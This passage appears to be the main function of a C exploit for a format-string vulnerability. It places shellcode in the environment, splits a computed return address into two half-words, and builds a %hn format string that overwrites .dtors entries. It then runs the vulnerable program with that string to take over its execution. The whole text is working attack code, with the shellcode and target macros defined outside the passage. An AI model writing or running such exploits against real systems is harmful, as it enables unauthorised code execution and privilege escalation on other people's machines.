int main(int argc, char **argv)
{
	char 	buf[BUF];
	char	*p = buf;

	int	n1, n2, offset = OFFSET;
	int	ret1, ret2;

	/* put shellcode in environment */
	char	*envp[2] = {sc, NULL};
	int	ret = 0xbffffffa - strlen(sc) - strlen(VULN);

	/* check command line for offset */
	if (argc > 1)
		offset = atoi(argv[1]);

	/* split the ret address in 2 words */
	SPLITW(ret1, ret2, ret);

	/* initialize the malicious buffer */
	bzero(buf, BUF);

	/* address part of the format string */
	*((void **)p) = (void *)(DTORS);
	p += 4;
	*((void **)p) = (void *)(DTORS + 2);
	p += 4;

	/* calculate numeric arguments for the write string */
	n1 = (ret1 - strlen(buf))		% 0x10000;
	n2 = (ret2 - strlen(buf) - n1)		% 0x10000;

	/* check for potentially dangerous numeric arguments below 10 */
	n1 += (n1 < 10) ? (0x10000) : (0);
	n2 += (n2 < 10) ? (0x10000) : (0);

	/* build the write string part of the format string */
	sprintf(p, "%%.%du%%%d$hn%%.%du%%%d$hn", n1, offset, n2, offset + 1);

	/* print some output */
	fprintf(stderr, "Using .dtors address\t: %p\n", DTORS);
	fprintf(stderr, "Using ret address\t: %p\n", ret);
	fprintf(stderr, "Using format string\t: %s\n\n", buf);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, envp);
	perror("execle");
}